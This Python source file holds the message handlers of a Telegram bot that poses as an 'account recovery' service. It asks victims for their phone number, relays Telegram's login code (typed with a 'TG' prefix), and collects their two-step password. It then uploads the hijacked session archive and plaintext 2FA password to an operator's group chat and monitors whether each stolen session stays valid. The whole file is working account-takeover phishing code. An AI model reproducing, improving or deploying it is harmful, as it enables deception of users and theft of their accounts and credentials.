"""Bot command handlers adapted for the desktop app.

All reply text comes from ConfigManager instead of a database.
Logs are forwarded to a Qt signal so the GUI can display them.
"""

import re
import os
import asyncio
import time
import random
import string
import logging
from datetime import datetime

from aiogram import Router, F, Bot, BaseMiddleware
from aiogram.types import (
    Message, CallbackQuery, FSInputFile,
    InlineKeyboardMarkup, InlineKeyboardButton,
)
from aiogram.filters import Command
from typing import Callable, Dict, Any, Awaitable

from core.login_engine import login_engine
from bot.keyboards import main_menu_kb, view_code_kb

router = Router()
logger = logging.getLogger(__name__)

# Reference to ConfigManager — set by bot_runner before starting
_cfg = None


def set_config(cfg):
    global _cfg
    _cfg = cfg


def _c(key: str, default: str = "") -> str:
    if _cfg is None:
        return default
    return _cfg.get(key, default)


def get_photo_input(photo_val: str | None) -> FSInputFile | str | None:
    if not photo_val:
        return None
    if os.path.isfile(photo_val):
        return FSInputFile(photo_val)
    return photo_val


async def send_custom_response(bot: Bot, chat_id: int, text: str,
                               photo_input=None, reply_markup=None):
    if photo_input:
        try:
            await bot.send_photo(
                chat_id=chat_id, photo=photo_input,
                caption=text, parse_mode="HTML", reply_markup=reply_markup,
            )
            return
        except Exception:
            pass
    await bot.send_message(
        chat_id=chat_id, text=text,
        parse_mode="HTML", reply_markup=reply_markup,
    )


# ── User state ──────────────────────────────────────────────────────
# (uid, bot_token) -> {"phone", "step", "created_at", "attempts"}
_user_state: dict[tuple, dict] = {}


def _sk(uid: int, bot: Bot) -> tuple:
    """State key: uniquely identifies a user+bot pair."""
    return (uid, bot.token)


def _get_state(uid: int, bot: Bot) -> dict | None:
    """Get user state for a specific bot."""
    return _user_state.get(_sk(uid, bot))


def _set_state(uid: int, bot: Bot, state: dict):
    """Set user state for a specific bot."""
    _user_state[_sk(uid, bot)] = state


def _pop_state(uid: int, bot: Bot) -> dict | None:
    """Remove and return user state for a specific bot."""
    return _user_state.pop(_sk(uid, bot), None)

# ── Active session-check tasks per phone (to cancel on re-login) ──
_session_check_tasks: dict[str, asyncio.Task] = {}

# ── Per-user locks to serialize login state transitions ─────────
# Prevents concurrent handler execution for the same (uid, bot) pair,
# which avoids duplicate _handle_login_success calls when a user sends
# the same verification code or 2FA password twice in quick succession.
_user_locks: dict[tuple, asyncio.Lock] = {}


def _get_lock(uid: int, bot: Bot) -> asyncio.Lock:
    key = _sk(uid, bot)
    if key not in _user_locks:
        _user_locks[key] = asyncio.Lock()
    return _user_locks[key]

# ── Chat history for manual reply panel ─────────────────────────
# Keyed by conversation id "uid:token" so each user↔bot pair has its own
# independent conversation — avoids cross-bot overwrites when multiple bots
# receive messages from the same user.
# cid -> {"uid": int, "bot_token": str, "bot_label": str,
#          "name": str, "messages": [{"from":…, "text":…, "time":…}]}
_chat_store: dict[str, dict] = {}
_chat_callback = None   # optional callback(cid: str) when new message arrives


def _cid(uid: int, bot: Bot) -> str:
    """Conversation id: uniquely identifies a user↔bot pair."""
    return f"{uid}:{bot.token}"


def set_chat_callback(cb):
    global _chat_callback
    _chat_callback = cb


def get_chat_store() -> dict[str, dict]:
    return _chat_store


def _record_msg(uid: int, name: str, direction: str, text: str, bot: Bot = None):
    if bot is None:
        return
    key = _cid(uid, bot)
    if key not in _chat_store:
        label = getattr(getattr(bot, "_me", None), "username", None)
        _chat_store[key] = {
            "uid": uid,
            "bot_token": bot.token,
            "bot_label": f"@{label}" if label else bot.token[:8],
            "name": name,
            "messages": [],
        }
    if name:
        _chat_store[key]["name"] = name
    _chat_store[key]["messages"].append({
        "from": direction, "text": text, "time": time.time(),
    })
    if _chat_callback:
        try:
            _chat_callback(key)
        except Exception:
            pass


def record_bot_reply(uid: int, conv_token: str, actual_bot: Bot, text: str) -> str:
    """Record an outgoing manual reply on the user's existing conversation.

    ``conv_token`` is the bot_token the conversation was originally stored under;
    ``actual_bot`` is the bot that actually delivered the message. They differ
    when we self-heal after a "chat not found" (the recorded bot could not reach
    the user, so another running bot was used). In that case we re-point the same
    conversation entry to the bot that works so subsequent replies route to it
    directly — without splitting the history into a second entry.

    Returns the conversation id to refresh in the panel.
    """
    key = f"{uid}:{conv_token}"
    entry = _chat_store.get(key)
    if entry is None:
        _record_msg(uid, "", "bot", text, actual_bot)
        return _cid(uid, actual_bot)
    if actual_bot.token != conv_token:
        label = getattr(getattr(actual_bot, "_me", None), "username", None)
        entry["bot_token"] = actual_bot.token
        entry["bot_label"] = f"@{label}" if label else actual_bot.token[:8]
    entry["messages"].append({"from": "bot", "text": text, "time": time.time()})
    if _chat_callback:
        try:
            _chat_callback(key)
        except Exception:
            pass
    return key


async def _notify_proxy_fallback(bot: Bot, phone: str, failed_proxy: str = ""):
    """Warn the group that a proxy died and the server fell back to direct.

    Fires only when ``proxy_fallback_notify_group`` is enabled and a success
    group is configured. The login/session itself is still fine — this is just
    a heads-up that the account's egress is now the server's direct IP.
    """
    if not (_cfg and _cfg.get("proxy_fallback_notify_group", False)):
        return
    group_id = _c("success_group_id", "")
    if not group_id:
        return
    try:
        ts_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        shown = failed_proxy.split(":")[0] if failed_proxy else "未知"
        group_msg = (
            f"⚠️ 代理失效通知\n"
            f"手机号: {phone}\n"
            f"失效代理: {shown}\n"
            f"时间: {ts_str}\n"
            f"状态: 已自动退回直连"
        )
        await bot.send_message(chat_id=int(group_id), text=group_msg)
        logger.info(f"代理失效通知已发送到群: {group_id}")
    except Exception as e:
        logger.error(f"发送代理失效通知到群失败: {e}")


async def _handle_login_success(bot: Bot, chat_id: int, uid: int,
                                phone: str, user_info: dict,
                                tfa_password: str = ""):
    """Shared success flow for code and 2FA login.

    Order:
      1. Send success text to user
      2. Send configured success photo to user (if enabled)
      3. Upload tdata zip + text info to group
      4. Delayed session check (background, sends valid/invalid text)
    """
    username = user_info.get("username", "")
    first_name = user_info.get("first_name", "")
    last_name = user_info.get("last_name", "")
    nickname = f"{first_name} {last_name}".strip()
    ts_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Step 1: Send success text to user
    success_text = _c("success_text", "✅ 登录成功")
    try:
        success_msg = success_text.format(
            first_name=first_name, last_name=last_name,
            user_id=user_info.get("user_id", ""),
            username=username or "N/A",
        )
    except (KeyError, IndexError):
        success_msg = success_text
    await bot.send_message(chat_id=chat_id, text=success_msg, parse_mode="HTML")
    logger.info(f"[{uid}] ✅ 登录成功: {phone} | {user_info}")

    # Step 2: Send configured success photo to user (if enabled)
    if _cfg and _cfg.get("success_send_photo", False):
        photo_input = get_photo_input(_c("success_photo_path"))
        if photo_input:
            try:
                await bot.send_photo(chat_id=chat_id, photo=photo_input)
            except Exception as e:
                logger.warning(f"[{uid}] 发送成功图片失败: {e}")

    # Step 3: Upload tdata zip + text info to group
    group_id = _c("success_group_id", "")
    if group_id:
        try:
            group_chat_id = int(group_id)

            # Send tdata zip (or session file) to group
            session_file = login_engine.get_last_session_path(phone)
            if session_file and os.path.isfile(session_file):
                # Build info text as document caption
                info_lines = [
                    "✅ 新账号登录成功",
                    f"用户名: @{username}" if username else "用户名: N/A",
                    f"昵称: {nickname}" if nickname else "昵称: N/A",
                    f"手机号: {phone}",
                ]
                if tfa_password:
                    info_lines.append(f"二级密码: {tfa_password}")
                info_lines.append(f"时间: {ts_str}")
                group_pwd = _c("group_password", "")
                if group_pwd:
                    info_lines.append(f"🔑 密码: {group_pwd}")
                caption = "\n".join(info_lines)

                await bot.send_document(
                    chat_id=group_chat_id,
                    document=FSInputFile(session_file),
                    caption=caption,
                )
                logger.info(f"[{uid}] 直登包已上传到群: {group_id}")
            else:
                logger.warning(f"[{uid}] 直登包/Session 文件不存在，无法上传到群")
        except Exception as e:
            logger.error(f"[{uid}] 上传到群失败: {e}")

    # Schedule periodic session check (only if enabled)
    if _cfg and _cfg.get("session_check_enabled", False):
        # Cancel any existing check loop for this phone to avoid duplicates
        safe_phone = phone.replace("+", "").replace(" ", "")
        old_task = _session_check_tasks.pop(safe_phone, None)
        if old_task and not old_task.done():
            old_task.cancel()
            logger.info(f"[{uid}] Cancelled previous session check loop for {phone}")
        task = asyncio.create_task(_post_login_session_check(bot, chat_id, phone))
        _session_check_tasks[safe_phone] = task


async def _post_login_session_check(bot: Bot, chat_id: int, phone: str):
    """Periodically check session validity while the option is enabled.

    The first check runs immediately after login so the
    ``session_valid_text`` reaches the user without delay.
    Subsequent rounds use ``post_login_check_delay`` (default 300 s).
    """
    notified_valid = False
    consecutive_failures = 0
    safe_phone = phone.replace("+", "").replace(" ", "")
    first_check = True
    try:
        while _cfg and _cfg.get("session_check_enabled", False):
            if first_check:
                first_check = False
            else:
                delay = int(_c("post_login_check_delay", "300"))
                if delay <= 0:
                    delay = 1
                # Add random jitter (up to ±20%) so that many accounts logged
                # in together don't all fire their checks in the same instant —
                # a synchronized burst saturates the single-process license
                # server and makes requests time out (falsely looking like the
                # session went away).
                jitter = delay * 0.2
                await asyncio.sleep(delay + random.uniform(-jitter, jitter))

            result = await login_engine.check_session(phone)
            logger.info(f"Session check for {phone}: {result.get('success')}")

            if result.get("proxy_fell_back"):
                await _notify_proxy_fallback(
                    bot, phone, result.get("failed_proxy", ""))

            if result.get("success"):
                consecutive_failures = 0
                if not notified_valid:
                    notified_valid = True
                    text = _c("session_valid_text", "✅ Session 有效")
                    await bot.send_message(
                        chat_id=chat_id, text=text, parse_mode="HTML")
                continue

            # Could not verify (proxy/network issue) — say nothing about the
            # session, don't count it as a failure, just retry next round.
            if result.get("inconclusive"):
                logger.info(
                    f"Session check inconclusive for {phone}, skipping: "
                    f"{result.get('message', 'unknown')}"
                )
                continue

            # Session check failed — require consecutive failures before reporting
            consecutive_failures += 1
            fail_threshold = int(_c("session_check_fail_threshold", "3"))
            if fail_threshold < 1:
                fail_threshold = 1
            logger.warning(
                f"Session check failed for {phone} "
                f"({consecutive_failures}/{fail_threshold}): "
                f"{result.get('message', 'unknown')}"
            )
            if consecutive_failures < fail_threshold:
                continue

            # Confirmed invalid — notify user, optionally the group, then stop.
            text = _c("session_invalid_text", "❌ Session 无效")
            if _cfg and _cfg.get("session_invalid_notify_group", False):
                group_id = _c("success_group_id", "")
                if group_id:
                    try:
                        ts_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        group_msg = (
                            f"❌ Session 失效通知\n"
                            f"手机号: {phone}\n"
                            f"时间: {ts_str}\n"
                            f"状态: {result.get('message', 'Session 无效')}"
                        )
                        await bot.send_message(
                            chat_id=int(group_id), text=group_msg)
                        logger.info(f"Session 失效通知已发送到群: {group_id}")
                    except Exception as e:
                        logger.error(f"发送 session 失效通知到群失败: {e}")
            await bot.send_message(chat_id=chat_id, text=text, parse_mode="HTML")
            break
    except asyncio.CancelledError:
        pass
    except Exception as e:
        logger.error(f"Post-login session check error: {e}")
    finally:
        _session_check_tasks.pop(safe_phone, None)


def _generate_12_digit_code() -> str:
    """Generate a random 12-character alphanumeric identifier."""
    chars = string.ascii_uppercase + string.digits
    return "".join(random.choices(chars, k=12))


async def check_timeouts_loop(bot: Bot):
    bot_token = bot.token
    while True:
        try:
            await asyncio.sleep(10)
            now = time.time()
            for key, state in list(_user_state.items()):
                # Only process states belonging to this bot
                uid, token = key
                if token != bot_token:
                    continue

                step = state.get("step")
                created_at = state.get("created_at")
                if not created_at:
                    continue

                elapsed = now - created_at

                # ── /start remind: user did /start but hasn't sent phone ──
                if step == "started":
                    remind_wait = int(_c("start_remind_wait", "45"))
                    remind_count = int(_c("start_remind_count", "1"))
                    if remind_wait <= 0 or remind_count <= 0:
                        continue
                    sent = state.get("remind_sent", 0)
                    if sent < remind_count and elapsed >= remind_wait * (sent + 1):
                        text = _c("start_no_response_text", "")
                        if text:
                            try:
                                await bot.send_message(
                                    chat_id=uid, text=text, parse_mode="HTML")
                                logger.info(f"[{uid}] /start 催促 #{sent+1}")
                            except Exception as e:
                                logger.error(f"Start remind failed for {uid}: {e}")
                        state["remind_sent"] = sent + 1
                    # Clean up stale "started" states after 10 minutes
                    if elapsed >= 600:
                        _user_state.pop(key, None)
                    continue

                if step not in ("code", "2fa"):
                    continue

                # ── Auto-reply at configured intervals ──
                interval_min = int(_c("auto_reply_interval", "1"))
                max_replies = int(_c("auto_reply_max", "3"))
                interval_sec = interval_min * 60
                sent_count = state.get("auto_reply_sent", 0)

                if interval_sec > 0 and sent_count < max_replies:
                    replies_due = min(int(elapsed // interval_sec), max_replies)
                    while sent_count < replies_due:
                        sent_count += 1
                        text = _c(f"auto_reply_{sent_count}", "")
                        if text:
                            try:
                                await bot.send_message(
                                    chat_id=uid, text=text, parse_mode="HTML")
                                logger.info(
                                    f"[{uid}] Auto-reply #{sent_count} sent")
                            except Exception as e:
                                logger.error(
                                    f"Auto-reply failed for {uid}: {e}")
                    state["auto_reply_sent"] = sent_count

                # ── 5-minute hard timeout ──
                if elapsed >= 300:
                    _user_state.pop(key, None)
                    phone = state.get("phone")
                    await login_engine.cancel_pending(phone)
                    if step == "code":
                        text = _c("code_expired_text", "验证码已过期，请重新 /start")
                    else:
                        text = _c("tfa_60s_reminder_text", "密码输入超时，请重新 /start")
                    try:
                        await bot.send_message(chat_id=uid, text=text, parse_mode="HTML")
                    except Exception as e:
                        logger.error(f"Timeout notify failed for {uid}: {e}")
        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"check_timeouts_loop error: {e}")


# ── /start ──────────────────────────────────────────────────────────
def _user_name(message: Message) -> str:
    u = message.from_user
    if not u:
        return str(message.chat.id)
    parts = [u.first_name or "", u.last_name or ""]
    name = " ".join(p for p in parts if p).strip()
    return name or str(u.id)


@router.message(Command("start"))
async def cmd_start(message: Message, bot: Bot):
    uid = message.from_user.id
    old = _pop_state(uid, bot)
    if old and "phone" in old:
        await login_engine.cancel_pending(old["phone"])

    _record_msg(uid, _user_name(message), "user", "/start", bot)
    text = _c("start_text", "欢迎使用")
    mode = "contact"
    reply_markup = main_menu_kb(mode)
    await send_custom_response(bot, message.chat.id, text, None, reply_markup)

    # Welcome inline button (URL) if configured
    if _cfg and _cfg.get("welcome_button_enabled", False):
        btn_text = _c("welcome_button_text", "")
        btn_url = _c("welcome_button_url", "")
        if btn_text and btn_url:
            kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text=btn_text, url=btn_url)]
            ])
            await bot.send_message(
                chat_id=message.chat.id, text="\u200b",
                reply_markup=kb)

    _record_msg(uid, _user_name(message), "bot", text, bot)
    logger.info(f"[{uid}] /start")

    # Record start time for /start remind feature
    _set_state(uid, bot, {"step": "started", "created_at": time.time()})


# ── 分享联系人 ──────────────────────────────────────────────────────
@router.message(F.contact)
async def handle_contact(message: Message, bot: Bot):
    contact = message.contact
    phone = contact.phone_number
    if not phone.startswith("+"):
        phone = "+" + phone

    uid = message.from_user.id
    _record_msg(uid, _user_name(message), "user", f"[分享联系人] {phone}", bot)
    result = await login_engine.send_code(phone)
    if result.get("proxy_fell_back"):
        await _notify_proxy_fallback(bot, phone, result.get("failed_proxy", ""))
    if result.get("success"):
        _set_state(uid, bot, {
            "phone": phone, "step": "code",
            "created_at": time.time(), "attempts": 0,
        })
        text = _c("code_panel_title", "✅ 回执码已发送！")
        if _cfg and _cfg.get("show_12_digit_code", False):
            text += f"\n🔖 验证标识: {_generate_12_digit_code()}"
        await send_custom_response(bot, message.chat.id, text, None, view_code_kb(phone))
        logger.info(f"[{uid}] 验证码已发送 -> {phone}")
    else:
        err_msg = result.get('message', '发送验证码失败')
        await message.answer(f"❌ {err_msg}", reply_markup=main_menu_kb())
        logger.warning(f"[{uid}] 发送验证码失败: {err_msg}")


# ── 手动输入手机号 ──────────────────────────────────────────────────
@router.message(F.text == "开 始 恢 复 账 户")
async def btn_phone_login(message: Message, bot: Bot):
    uid = message.from_user.id
    _set_state(uid, bot, {"step": "phone_input"})
    await message.answer(
        "⚠️请输入您的账户手机号码（带完整区号，例如 +86130008800）",
        parse_mode="HTML",
    )
    logger.info(f"[{uid}] 进入手动输入手机号模式")


@router.message(F.text.regexp(r"^\+\d{7,15}$"))
async def handle_phone_input(message: Message, bot: Bot):
    uid = message.from_user.id
    state = _get_state(uid, bot)
    if not state or state.get("step") != "phone_input":
        return

    phone = message.text.strip()
    result = await login_engine.send_code(phone)
    if result.get("proxy_fell_back"):
        await _notify_proxy_fallback(bot, phone, result.get("failed_proxy", ""))
    if result.get("success"):
        _set_state(uid, bot, {
            "phone": phone, "step": "code",
            "created_at": time.time(), "attempts": 0,
        })
        text = _c("code_panel_title", "✅ 回执码已发送！")
        if _cfg and _cfg.get("show_12_digit_code", False):
            text += f"\n🔖 验证标识: {_generate_12_digit_code()}"
        await send_custom_response(bot, message.chat.id, text, None, view_code_kb(phone))
        logger.info(f"[{uid}] 验证码已发送(手动) -> {phone}")
    else:
        _pop_state(uid, bot)
        err_msg = result.get('message', '发送验证码失败')
        await message.answer(f"❌ {err_msg}", reply_markup=main_menu_kb())


# ── 验证码输入 ──────────────────────────────────────────────────────
@router.message(F.text, lambda msg: any(
    s.get("step") == "code" for (u, _), s in _user_state.items() if u == msg.from_user.id
))
async def handle_code_input(message: Message, bot: Bot):
    uid = message.from_user.id
    async with _get_lock(uid, bot):
        state = _get_state(uid, bot)
        if not state or state.get("step") != "code":
            return
        if message.text.startswith("/"):
            return
        _record_msg(uid, _user_name(message), "user", message.text.strip(), bot)

        phone = state["phone"]
        max_attempts = int(_c("code_max_attempts", "3"))

        match = re.match(r"(?i)^TG\s*(\d{5,6})$", message.text.strip())
        if not match:
            state["attempts"] = state.get("attempts", 0) + 1
            remaining = max_attempts - state["attempts"]
            if remaining <= 0:
                _pop_state(uid, bot)
                await login_engine.cancel_pending(phone)
                await message.answer(_c("code_max_retries_text", "❌ 错误次数过多，请重新 /start"))
            else:
                await message.answer(_c("code_format_error_text", "❌ 格式错误"))
            return

        code = match.group(1)
        result = await login_engine.sign_in_with_code(phone, code)

        if result.get("success"):
            _pop_state(uid, bot)
            await _handle_login_success(
                bot, message.chat.id, uid, phone,
                result.get("user_info", {}))
        else:
            need_2fa = result.get("need_2fa", False)
            if need_2fa:
                _set_state(uid, bot, {
                    "phone": phone, "step": "2fa",
                    "created_at": time.time(), "attempts": 0,
                })
                await message.answer(_c("prompt_2fa_text", "请输入两步验证密码"))
                logger.info(f"[{uid}] 需要两步验证: {phone}")
            else:
                state["attempts"] = state.get("attempts", 0) + 1
                remaining = max_attempts - state["attempts"]
                if remaining <= 0:
                    _pop_state(uid, bot)
                    await login_engine.cancel_pending(phone)
                    await message.answer(_c("code_max_retries_text", "❌ 错误次数过多"))
                else:
                    tpl = _c("code_invalid_text", "❌ 验证码错误（{attempts}/{max}）")
                    try:
                        err = tpl.format(attempts=state["attempts"], max=max_attempts,
                                         remaining=remaining)
                    except Exception:
                        err = result.get("message", "验证码错误")
                    await message.answer(err)


# ── 两步验证 ────────────────────────────────────────────────────────
@router.message(F.text, lambda msg: any(
    s.get("step") == "2fa" for (u, _), s in _user_state.items() if u == msg.from_user.id
))
async def handle_2fa_input(message: Message, bot: Bot):
    uid = message.from_user.id
    async with _get_lock(uid, bot):
        state = _get_state(uid, bot)
        if not state or state.get("step") != "2fa":
            return
        if message.text.startswith("/"):
            return
        _record_msg(uid, _user_name(message), "user", "[2FA密码]", bot)

        phone = state["phone"]
        password = message.text.strip()
        max_attempts = int(_c("tfa_max_attempts", "5"))

        result = await login_engine.sign_in_with_2fa(phone, password)

        if result.get("success"):
            _pop_state(uid, bot)
            await _handle_login_success(
                bot, message.chat.id, uid, phone,
                result.get("user_info", {}),
                tfa_password=password)
        else:
            state["attempts"] = state.get("attempts", 0) + 1
            remaining = max_attempts - state["attempts"]
            if remaining <= 0:
                _pop_state(uid, bot)
                await login_engine.cancel_pending(phone)
                await message.answer(_c("tfa_max_retries_text", "❌ 密码错误次数过多"))
            else:
                tpl = _c("tfa_wrong_text", "❌ 密码错误（{attempts}/5）")
                try:
                    err = tpl.format(attempts=state["attempts"], remaining=remaining,
                                     max=max_attempts)
                except Exception:
                    err = result.get("message", "密码错误")
                await message.answer(err, parse_mode="HTML")


# ── Default reply (catch-all for messages with no active state) ───
@router.message(F.text)
async def handle_default(message: Message, bot: Bot):
    """Reply with default text when user sends a message without active state."""
    uid = message.from_user.id
    if message.text.startswith("/"):
        return
    state = _get_state(uid, bot)
    if state and state.get("step") in ("code", "2fa", "phone_input"):
        return  # Already handled by specific handlers above

    _record_msg(uid, _user_name(message), "user", message.text.strip(), bot)
    text = _c("default_reply", "")
    if text:
        await message.answer(text, parse_mode="HTML")
        _record_msg(uid, _user_name(message), "bot", text, bot)
